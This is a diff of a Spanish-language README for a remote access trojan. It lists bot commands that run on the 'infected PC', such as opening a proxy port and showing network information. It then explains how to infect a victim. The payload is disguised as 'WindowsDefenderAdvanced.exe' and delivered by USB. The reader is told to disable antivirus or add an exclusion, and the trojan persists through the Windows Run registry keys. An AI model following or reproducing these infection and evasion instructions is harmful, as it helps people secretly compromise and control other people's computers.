@@ -167,9 +167,9 @@ __Ejemplo:__
 ````
 
 ## /proxy
-`Crea  - [PC Infectada]`
+`Abre un puerto localhost:8081 - [PC Infectada]`
+No recomentable ya que, windows mandará un mensaje de FireWall, por ahora no se recomienda.
 
-`Creo que abre un puerto a la victima. <= por verificar`
 ## /red_info
 `Muestra información de la red- [PC Infectada]`
 ## /reiniciar
@@ -274,14 +274,15 @@ ___¿Cómo infecto a la victima?___
   ![Final files](https://i.imgur.com/N7obd7w.png)
 
 
-__Nota:__ No cambiar de nombre al archivo `WindowsDefenderAdvanced.exe`, si usted le cambia de nombre, el RAt quedará obsoleto.
-- Usten guardará el archivo en un USB
-- Es necesario desactivar el antivirus o agregar una exclusión en al siguiente ruta: `"C:\Users\Public\Security\Windows Defender"`
+__Nota:__ No cambiar de nombre al archivo `WindowsDefenderAdvanced.exe`, si usted le cambia el nombre, el RAT quedará obsoleto.
+- Usten guardará el archivo en un USB.
+- Conectará el USB a la [PC] a infectar.
+- Se recomienda desactivar el antivirus o agregar una exclusión en al siguiente ruta: `"C:\Users\Public\Security\Windows Defender"`.
 - Lo siguiente es ejecutar el archivo `WindowsDefenderAdvanced.exe` en el USB, el RAT se replicará en la siguiente ruta `"C:\Users\Public\Security\Windows Defender"`, Se recomienda no sacar el USB al instante ya que el `RAT` se estará replicando en la ruta.
 
 __NOTA:__ Al ejecutar el archivó, ésta automaticamente modificará el registro de windows para que se inicie siempre al prender la computadora.
 
-El RAT tratará de modificar la siguiente ruta del registro `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run` por lo cual necesitará permisos de administrador, por ende se recomienda que la primera ejecución se realice con permisos de administrador, en caso de que no lo ejecute con permisos de administrador, el RAT modificará la siguiente ruta `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
+El RAT tratará de modificar la siguiente ruta del registro `"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"` por lo cual necesitará permisos de administrador, por ende se recomienda que la primera ejecución se realice con permisos de administrador, en caso de que no lo ejecute con permisos de administrador, el RAT modificará la siguiente ruta `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"`
 
 __Explicación:__ 
 * `HKEY_LOCAL_MACHINE:` El RAT se ejecutará en todos los usuarios exitentes y los nuevos usuarios de la computadora
